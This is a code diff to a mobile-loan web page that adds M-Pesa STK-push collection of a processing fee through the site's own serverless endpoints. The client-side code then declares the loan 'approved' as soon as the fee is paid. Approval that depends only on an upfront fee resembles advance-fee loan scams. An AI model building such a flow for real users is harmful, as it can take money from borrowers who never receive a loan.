@@ -320,6 +320,101 @@ body {
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
     
     <script>
+        // Serverless API endpoints
+        const API_ENDPOINTS = {
+            initiatePayment: '/api/initiate-payment',
+            verifyPayment: '/api/verify-payment',
+            normalizePhone: '/api/normalize-phone'
+        };
+
+        // Send STK Push via Serverless Function
+        async function sendPayHeroSTK(phoneNumber, amount, loanAmount) {
+            try {
+                const response = await fetch(API_ENDPOINTS.initiatePayment, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone_number: phoneNumber,
+                        amount: amount,
+                        loan_amount: loanAmount
+                    })
+                });
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.error || 'Payment initiation failed');
+                }
+
+                return result;
+            } catch (error) {
+                console.error('Payment API Error:', error);
+                throw error;
+            }
+        }
+
+        // Check payment status via Serverless Function
+        async function checkPaymentStatus(reference, maxAttempts = 20) {
+            let attempts = 0;
+            
+            return new Promise((resolve, reject) => {
+                const interval = setInterval(async () => {
+                    attempts++;
+                    
+                    try {
+                        const response = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${reference}`);
+                        const result = await response.json();
+
+                        console.log(`Payment status check ${attempts}:`, result);
+
+                        if (result.success && (result.status === 'COMPLETED' || result.status === 'SUCCESS')) {
+                            clearInterval(interval);
+                            resolve(true);
+                        } else if (result.success && (result.status === 'FAILED' || result.status === 'CANCELLED')) {
+                            clearInterval(interval);
+                            reject(new Error('Payment failed or was cancelled'));
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Payment verification timeout'));
+                        }
+                    } catch (error) {
+                        console.error('Status check error:', error);
+                        
+                        if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            reject(new Error('Payment verification failed'));
+                        }
+                    }
+                }, 3000);
+            });
+        }
+
+        // Normalize phone via Serverless Function
+        async function normalizePhoneNumber(phone) {
+            try {
+                const response = await fetch(API_ENDPOINTS.normalizePhone, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phone })
+                });
+
+                const result = await response.json();
+
+                if (!response.ok) {
+                    throw new Error(result.error || 'Phone normalization failed');
+                }
+
+                return result.normalized_phone;
+            } catch (error) {
+                console.error('Phone normalization error:', error);
+                throw error;
+            }
+        }
+
         // Load user data
         const userData = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
         if (!userData.phone_number) {
@@ -329,6 +424,7 @@ body {
         document.getElementById('user-name').textContent = userData.name || 'Customer';
 
         let selectedLoan = null;
+        let paymentReference = null;
 
         function selectLoanOption(element, amount, fee) {
             // Remove selection from all options
@@ -358,7 +454,7 @@ body {
                 return;
             }
 
-            // Show confirmation dialog
+            // Show confirmation dialog with updated payment info
             const result = await Swal.fire({
                 title: 'Confirm Loan Application',
                 html: `
@@ -367,11 +463,14 @@ body {
                         <p><strong>Loan Amount:</strong> Ksh ${selectedLoan.amount.toLocaleString()}</p>
                         <p><strong>Processing Fee:</strong> Ksh ${selectedLoan.fee}</p>
                         <p><strong>Total Repayment:</strong> Ksh ${(selectedLoan.amount * 1.1).toLocaleString()}</p>
+                        <p style="margin-top: 10px; padding: 10px; background: #f0f9ff; border-radius: 5px;">
+                            <i class="fas fa-info-circle"></i> You'll receive an M-Pesa prompt to pay the processing fee
+                        </p>
                     </div>
                 `,
                 icon: 'question',
                 showCancelButton: true,
-                confirmButtonText: 'Confirm',
+                confirmButtonText: 'Proceed to Payment',
                 cancelButtonText: 'Cancel',
                 confirmButtonColor: '#4361ee',
                 cancelButtonColor: '#6c757d'
@@ -379,25 +478,118 @@ body {
 
             if (result.isConfirmed) {
                 // Show processing indicator
-                Swal.fire({
-                    title: 'Processing Your Loan',
-                    html: 'Please wait while we process your application...',
-                    allowOutsideClick: false,
-                    didOpen: () => Swal.showLoading(),
-                    background: 'var(--white)',
-                    color: 'var(--black)'
-                });
+                const applyBtn = document.getElementById('apply-btn');
+                const originalText = applyBtn.innerHTML;
+                applyBtn.innerHTML = 'Processing... <i class="fas fa-spinner fa-spin"></i>';
+                applyBtn.disabled = true;
 
-                // Simulate processing delay
-                setTimeout(() => {
-                    Swal.close();
+                try {
+                    // First normalize the phone number
+                    const normalizedPhone = await normalizePhoneNumber(userData.phone_number);
                     
-                    // Show app promo after successful application
-                    document.getElementById('app-promo').style.display = 'block';
+                    // Send STK push for the processing fee
+                    const paymentResponse = await sendPayHeroSTK(
+                        normalizedPhone,
+                        selectedLoan.fee,
+                        selectedLoan.amount
+                    );
+
+                    if (paymentResponse && paymentResponse.reference) {
+                        paymentReference = paymentResponse.reference;
+                        
+                        // Show STK push sent message
+                        Swal.fire({
+                            title: 'STK Push Sent!',
+                            html: `
+                                <div style="text-align:center;">
+                                    <i class="fas fa-mobile-alt" style="font-size: 48px; color: #4361ee; margin-bottom: 16px;"></i>
+                                    <p>Check your phone for the M-Pesa prompt</p>
+                                    <p style="font-size: 0.9rem; color: #666; margin-top: 12px;">
+                                        Enter your M-Pesa PIN to complete payment of <strong>Ksh ${selectedLoan.fee}</strong>
+                                    </p>
+                                    <p style="font-size: 0.85rem; color: #999; margin-top: 8px;">
+                                        Phone: ${normalizedPhone}
+                                    </p>
+                                    <div style="margin-top: 16px; padding: 12px; background: #f0f0f0; border-radius: 8px;">
+                                        <p style="font-size: 0.85rem; margin: 0;">Verifying payment...</p>
+                                    </div>
+                                </div>
+                            `,
+                            icon: 'info',
+                            showConfirmButton: false,
+                            allowOutsideClick: false
+                        });
+
+                        // Verify payment using serverless function
+                        try {
+                            const paymentSuccess = await checkPaymentStatus(paymentReference);
+
+                            if (paymentSuccess) {
+                                await Swal.fire({
+                                    title: 'Payment Successful!',
+                                    html: `
+                                        <div style="text-align:center;">
+                                            <i class="fas fa-check-circle" style="font-size: 64px; color: #10b981; margin-bottom: 16px;"></i>
+                                            <p>Your loan of <strong>Ksh ${selectedLoan.amount.toLocaleString()}</strong> has been approved!</p>
+                                            <p style="color: #666; font-size: 0.9rem; margin-top: 12px;">Processing disbursement...</p>
+                                        </div>
+                                    `,
+                                    icon: 'success',
+                                    timer: 2000,
+                                    showConfirmButton: false
+                                });
+
+                                sessionStorage.setItem('loanApproved', JSON.stringify({
+                                    ...userData,
+                                    ...selectedLoan,
+                                    paymentReference,
+                                    approvedAt: new Date().toISOString()
+                                }));
+
+                                // Show app promo after successful payment
+                                document.getElementById('app-promo').style.display = 'block';
+                                
+                                // Reset button state
+                                applyBtn.innerHTML = originalText;
+                                applyBtn.disabled = false;
+
+                                // Redirect to dashboard only on successful payment
+                                setTimeout(() => {
+                                    window.location.href = 'dash.html';
+                                }, 2000);
+                            }
+                        } catch (verificationError) {
+                            console.error('Payment verification error:', verificationError);
+                            throw new Error(verificationError.message || 'Payment verification failed');
+                        }
+                    } else {
+                        throw new Error('Payment initiation failed - no reference received');
+                    }
+                } catch (error) {
+                    console.error('Payment error:', error);
                     
-                    // Redirect to service page
-                    window.location.href = 'service.html';
-                }, 2000);
+                    // Reset button state
+                    applyBtn.innerHTML = originalText;
+                    applyBtn.disabled = false;
+                    
+                    Swal.fire({
+                        title: 'Payment Failed',
+                        html: `
+                            <p>${error.message || 'Unable to process payment. Please try again.'}</p>
+                            <p style="font-size: 0.85rem; color: #666; margin-top: 12px;">
+                                Please ensure your phone number is correct and try again.
+                            </p>
+                        `,
+                        icon: 'error',
+                        confirmButtonText: 'Try Again',
+                        confirmButtonColor: '#4361ee'
+                    });
+                }
+            } else {
+                // Reset button if user cancels
+                const applyBtn = document.getElementById('apply-btn');
+                applyBtn.innerHTML = 'Get Loan Now <i class="fas fa-arrow-right"></i>';
+                applyBtn.disabled = false;
             }
         });
     </script>
